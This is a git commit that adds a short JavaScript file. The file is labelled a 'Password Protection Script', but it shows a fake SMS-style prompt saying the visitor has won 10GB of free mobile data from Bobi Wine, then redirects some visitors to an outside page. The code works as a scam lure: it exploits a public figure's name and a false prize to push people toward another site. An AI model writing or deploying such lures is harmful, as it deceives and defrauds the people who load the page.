6053d3f6edd76f460641f3eb096c9fad8bdd9f63
ukpeha55-stack <ukpeha55@gmail.com>
2026-01-07 16:01:57 +0100

    Create active-bobi.js

---
+++ active-bobi.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE 10GB'
+password = prompt(
+  'SMS: Congratulations! Your Mobile number is eligible to receive 10GB From Bobi Wine. Please press OK to Actiavte Data now.',
+  'ACTIVATE 10GB'
+);
+if (password != 'ACTIVATE 10GB') {
+  location.href = 'https://frigrant.org/bobi.html';
+}
